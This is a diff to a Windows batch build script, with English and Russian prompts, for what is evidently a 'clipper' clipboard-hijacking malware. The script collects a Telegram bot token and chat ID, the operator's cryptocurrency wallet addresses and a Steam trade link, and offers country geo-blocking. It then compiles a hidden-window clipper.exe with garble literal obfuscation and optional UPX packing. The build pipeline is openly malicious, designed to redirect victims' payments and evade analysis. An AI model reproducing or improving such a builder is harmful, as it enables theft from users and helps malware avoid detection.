@@ -1,5 +1,6 @@
 @echo off
 chcp 65001 >nul
+
 setlocal enabledelayedexpansion
 
 cls
@@ -11,37 +12,60 @@ echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
 echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
 echo.
 
-go install mvdan.cc/garble@latest
-if errorlevel 1 (
-    echo Failed to install garble
+where go >nul 2>&1
+if %errorlevel%==0 (
+    rem installed
+) else (
+    echo Go not found. Install go and add it to PATH / Go не найден. Установите Go и добавьте его в PATH.
+    echo Visit https://go.dev/dl/ for download / Перейдите на https://go.dev/dl/ для скачивания
     pause
     exit /b 1
 )
 
-echo.
-set /p "BOT_TOKEN=Bot token: "
-set /p "CHAT_ID=Chat ID: "
+where garble >nul 2>&1
+if %errorlevel%==0 (
+    rem installed
+) else (
+    go install mvdan.cc/garble@latest
+
+    if errorlevel 1 (
+        echo Failed to install garble / Ошибка при установке garble
+        pause
+        exit /b 1
+    )
+)
 
 echo.
-
-set /p "BTC=BTC address: "
-set /p "ETH=ETH address: "
-set /p "LTC=LTC address: "
-set /p "DOGE=DOGE address: "
-set /p "TON=TON address: "
-set /p "USDT=USDT TRC address: "
-set /p "SOL=SOL address: "
+set /p "BOT_TOKEN=Bot token / Токен бота: "
+set /p "CHAT_ID=Chat ID or Group ID / Ваш чат ID или ID группы: "
 
 echo.
 
-set /p "STEAM=Steam trade url: "
+set /p "BTC=BTC address / Адрес BTC: "
+set /p "ETH=ETH address / Адрес ETH: "
+set /p "LTC=LTC address / Адрес LTC: "
+set /p "DOGE=DOGE address / Адрес DOGE: "
+set /p "TON=TON address / Адрес TON: "
+set /p "USDT=USDT TRC address / Адрес USDT TRC: "
+set /p "SOL=SOL address / Адрес SOL: "
+
+echo.
+
+set /p "STEAM=Steam trade url / Ссылка на обмен стим: "
 
 echo.
 
 echo Enter country codes to block (ISO 3166-1 alpha-2)
 echo Example: RU,KZ,BY,UA,MD
 echo Press Enter to skip
-set /p "GEO_BLOCK=Geo block: "
+
+echo.
+
+echo Введите коды стран для блокировки (ISO 3166-1 alpha-2)
+echo Пример: RU,KZ,BY,UA,MD
+echo Нажмите Enter чтобы пропустить
+
+set /p "GEO_BLOCK=Geo block / Блокировка стран: "
 
 cls
 
@@ -73,7 +97,7 @@ if defined GEO_BLOCK (
     )
 )
 
-garble -seed=random -tiny build -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
+garble -literals -seed=random build -trimpath -ldflags="-H windowsgui !LDFLAGS!" -o clipper.exe
 if errorlevel 1 (
     echo Build failed
     pause
@@ -89,7 +113,7 @@ echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
 echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| build completed
 echo.
 
-echo Build successful! File: .\clipper.exe
+echo Build successful! / Билд создан: .\clipper.exe
 
 echo.
 set /p "USE_UPX=Use UPX? (y/n): "
@@ -99,14 +123,16 @@ if /i "!USE_UPX!"=="y" (
     
     if exist ".\upx.exe" (
         .\upx.exe --best clipper.exe
+        
         if errorlevel 1 (
-            echo UPX compression failed
+            echo UPX compression failed / Произошла ошибка при сжатии UPX
         ) else (
-            echo UPX compression successful  
+            echo UPX compression successful / Сжатие UPX успешно
         )
     ) else (
-        echo UPX not found in current directory
-        echo Please ensure upx.exe is in the same folder as this script
+        echo UPX not found in current directory / UPX не найден в текущей директории
+        echo Please ensure upx.exe is in the same folder as this script / Пожалуйста, убедитесь, что upx.exe находится в той же папке, что и этот скрипт
+        echo You can download it from https://upx.github.io/ / Вы можете скачать его с https://upx.github.io/
     )
 )
 
